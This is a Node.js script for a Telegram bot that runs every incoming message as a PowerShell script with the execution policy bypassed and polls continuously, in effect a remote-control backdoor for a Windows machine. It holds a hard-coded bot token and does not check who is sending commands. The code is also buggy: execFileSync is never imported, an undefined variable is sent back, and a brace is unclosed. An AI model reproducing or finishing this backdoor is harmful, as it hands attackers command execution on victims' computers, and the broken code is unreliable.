const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const serviceDir = process.cwd()
const path = require("path")
const os = require("os")
const fs = require("fs")

const execNoError = (cmd, args, options) => {
    try {
        return execFileSync(cmd, args, options).toString().trim()
    } catch (e) {
        return e.toString().trim()
    }
}


function execPowershellScript(script) {
    // Write script to a file in temp dir
    const scriptPath = path.join(os.tmpdir(), 'script.ps1')
    fs.writeFileSync(scriptPath, script)
    // Execute script
    return execNoError('powershell.exe', ['-ExecutionPolicy', 'Bypass', '-File', scriptPath])
}

// replace the value below with the Telegram token you receive from @BotFather
const token = '5374814839:AAG03l0RflXnIzJE3fMNFfnXymgjQFbg_ac';

// Create a bot instance
const bot = new TelegramBot(token, { polling: true });

// Get the chat ID from a message object
function getChatId(msg) {
  return msg.chat.id;
}

// Start listening for incoming messages
bot.on('message', (msg) => {
  const chatId = getChatId(msg);
  const message = msg.text;
  if (message !== null) {
    const result = execPowershellScript(message)
    console.log(`Powershell result: ${result}`)
    bot.sendMessage(chatId, stdout);

  // Run the command in PowerShell

    
    }

// Handle errors
bot.on('polling_error', (error) => {
  console.log(error);
});

// Run the bot as a service
setInterval(() => {
  try {
    bot.startPolling();
  } catch (err) {
    console.error(err);
  }
}, 60000);
